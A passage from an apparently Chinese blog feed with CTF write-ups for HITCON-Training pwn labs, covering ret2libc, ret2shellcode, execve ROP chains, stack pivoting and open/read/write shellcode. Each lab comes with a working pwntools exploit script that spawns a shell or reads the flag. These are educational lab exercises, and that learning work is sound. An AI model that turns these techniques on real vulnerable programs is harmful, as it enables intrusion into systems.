<span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#懵逼栈</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p><p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p><p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月24-Hitcon(二)</title>
      <link href="/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/"/>
      <url>/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月24-hitcon-二"><a href="#Pwn-10月24-hitcon-二" class="headerlink" title="Pwn-10月24-hitcon(二)"></a>Pwn-10月24-hitcon(二)</h1><blockquote><p>继续hitcon的解题之路。</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且leak出libc基地址，从而getshell？😄</p></blockquote><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下：</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>程序让我们输入一个地址，以整型的形式输入，然后它会返回这个地址存有的内容给我们，然后让我们<code>leave some message</code>，并且打印出来，我们可以通过这个功能从GOT表中将一些函数的真实地址打印出来，然后通过libc文件中函数的偏移量计算基地址，例如将某一个函数的GOT条目的地址传给write函数，就可以泄漏这个函数在进程空间中的真实地址，<strong>GOT表中所存的puts函数的地址便是在ret2lib进程中的实际地址。</strong></p><p>IDA里面看看：</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>通过命令<code>readelf -V ret2lib</code>可以查到其libc库版本为<code>libc.so.6</code>：</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>通过pwntools的elf模块我们可以链接该libc.so.6库，简单看看里面的函数地址：</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>同样针对这题可以使用IDA <code>alt + t</code>来查找GOT表puts地址，也可通过上述ELF模块链接ret2lib程序，通过<code>elf.got[&#39;puts&#39;]</code>来获取GOT表中puts条目地址:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" class="lazyload"></p><p>将134520860作为我们需要获得内容的地址输入程序：</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>然后我们就得到了puts函数条目在存在GOT表中的内容，即<strong>此次</strong>程序运行时puts函数的真实地址<code>0xf7639250</code>。</p><p>libc基地址计算：<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p><p>这里我只是简单的展示一下计算方法，实际上在程序运行过程中libc的<strong>基地址是会发生变化的</strong>，所以不能提前计算好基地址，再写exp，要在exp里面计算基地址，这样就不会出错。</p><p>既然已经可以计算出system函数的地址了，那么我们就需要找一个sh，可以寻找binary程序本身中的字符串，也可以使用libc中的：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" class="lazyload"></p><p>然后我们可以通过Print_message()函数溢出，覆盖EIP的值使其跳转执行system函数：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd018a67369c.png" class="lazyload"></p><p>可以看到padding长度为60，接下来写exp即可.</p></blockquote><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>libcbase_addr = puts_addr - libc_puts</p><p>system_addr = libcbase_addr + libc.symbols[‘system’]</p><p>return_addr = ‘anything’</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_putsreturn_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#main函数地址</span>success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh\x00是因为可能匹配到其他字符串，从而加个截断</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" class="lazyload"></p><h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote><p>simplerop ==&gt; easyrop ==&gt; babyrop?经历绝望的过程😭，又是一个构造ropchain的题目。</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ./simplerop</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" class="lazyload"></p><p>开启了NX，栈不可执行防护。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>通过ida看看：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" class="lazyload"></p><p>逻辑十分简单，就溢出然后构造rop chain，通过gdb动态调试得到溢出点，padding为32：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" class="lazyload"></p><p>但是这个题型貌似叫：<code>ret2systemcall</code>，此程序中既无system函数，也无/bin/sh字符串，还是静态编译，新姿势 ==&gt;rop chain后 int 0x80中断从而执行系统调用==&gt; <code>execve(/bin/sh)</code>。</p><p><strong>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)</strong></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" class="lazyload"></p></blockquote><p>不知道为啥我的ROPgadget查不到我们想要的gadget。</p><h3 id="构造exp-1"><a href="#构造exp-1" class="headerlink" title="构造exp"></a>构造exp</h3><blockquote><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd043f350073.png" class="lazyload"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及: libc泄露，leak libc基地址，ropchain系统调用（int 0x80）。</p><p>ropchain系统调用原理：在无system函数，/bin/sh可用的情况下，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(“/bin/sh”, 0, 0)。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月23-Hitcon(一)</title>
      <link href="/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/"/>
      <url>/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月23-Hitcon-一"><a href="#Pwn-10月23-Hitcon-一" class="headerlink" title="Pwn-10月23-Hitcon(一)"></a>Pwn-10月23-Hitcon(一)</h1><blockquote><p>继续二进制修炼，今天开始肝Hiton-training，膜着<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>，以及另一位大佬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>的题解蹒跚前行。</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>貌似第一题会比较简单，先用IDA-Pro静态分析一下：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>貌似直接得到了一个能够输出flag的函数？由于这是个elf32位可执行文件所以我们需要在linux下面执行：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>可以很简单就看懂逻辑，输入一个值，然后比较如果相等，得出flag。</p></blockquote><h3 id="解法1-patch"><a href="#解法1-patch" class="headerlink" title="解法1 - patch"></a>解法1 - patch</h3><blockquote><p>IDA Pro – keypatch，使用<code>keypatch</code>插件来修改汇编代码，我们可以直接将关键的一步nop掉或者改成完全相反的操作。</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>例如将<code>.text:08048722</code>的跳转汇编指令改为jmp无条件跳转，或者是与jnz相反的jz操作。</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>修改为无条件跳转后需要将其保存到对应文件中：<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" class="lazyload"></p><p>然后去把文件挪到linux上运行试试发现并没有用，因为改为jmp后其函数直接少了一部分对flag的操作：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" class="lazyload"></p><p>所以我们只能将原样本中的jnz改为jz了，改完之后函数已经成为不等则输出flag了：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" class="lazyload"></p><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" class="lazyload"></p></blockquote><h3 id="解法2-gdb-set-register-value"><a href="#解法2-gdb-set-register-value" class="headerlink" title="解法2 - gdb set register value"></a>解法2 - gdb set register value</h3><blockquote><p>通过gdb动态调试，并且在即将进行比较前，将 eax置为与edx相同的值即可：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" class="lazyload"></p><p>然后即可得到flag。</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec orw.bin</code>，题目orw的意思是open，read，write这三个函数。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" class="lazyload"></p><p>emmm这是我做的第一个开启了Stack保护的题目呢。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下可以看到直接是让你输入shellcode：<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf104eea350.png" class="lazyload"></p><p>放IDA pro里面看看：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" class="lazyload"></p><p>细看一下<code>orw_seccomp()函数</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" class="lazyload"></p><p>prctl函数又是啥玩意儿？Prctl(用户和内核沟通的一个绝佳函数),这个函数可以对进程进行一些设置。<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">而有一道强网杯题目就好像用了这玩意儿的技术？</a></p><p>输入shellcode之后应该会执行，所以这题的目的是让我们自己构造shellcode去读取flag？既然要构造shellcode，那就需要用到pwntools的asm模块和shellcraft模块：</p><p>asm模块是将操作转换为汇编命令，而shellcraft是具有各种函数对应汇编命令的一个模块，十分好用：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" class="lazyload"></p><p>pwntools中的context模块又是用来干嘛的呢？</p><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>例如<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>根据题意和题解😂（正处于涨姿势的时候）写出exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open返回的文件文件描述符存贮在eax寄存器里 </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open读取的内容放在栈顶 </span><span class="token comment" spellcheck="true">#  write函数在栈顶读取0x100大小的内容并打印出来</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" class="lazyload"></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>题目名是return to shellcode的简写，应该是利用return返回然后执行shellcode之类的操作？</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" class="lazyload"></p><p>emmm没有开启啥保护，没有开启栈溢出检测，也没有开启栈不可执行（NX）。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>跑一下发现让我们输入字符串到Name里面，还有一个try your best？首先想到的是会不会又是啥栈溢出什么的。</p></blockquote><blockquote><p> <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" class="lazyload"></p></blockquote><blockquote><p>嗯，情况是有的：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf22016964b.png" class="lazyload"></p><p>通过gdb动态调试可以发现在输入try your best 的值的时候可以发生溢出，并且将EIP指向我们构造的位置：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" class="lazyload"></p><p>而这个临界值我们可以通过pattern search来查我们构造的pattern偏移量，得到为32。根据大佬的题解了解到return to shellcode是一种题型，我甚至想到了又用ROP chain???<code>黑人问号.jpg</code>😭。</p><p>原来return to shellcode的操作就是将shellcode写入name变量空间，然后通过返回到该地址从而执行shellcode(NX未开启，栈可执行)</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" class="lazyload"></p><p>该变量地址为0x804A060</p></blockquote><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><blockquote><p>这个exp需要用到shellcraft和asm，来将shellcode转为汇编指令：</p><pre 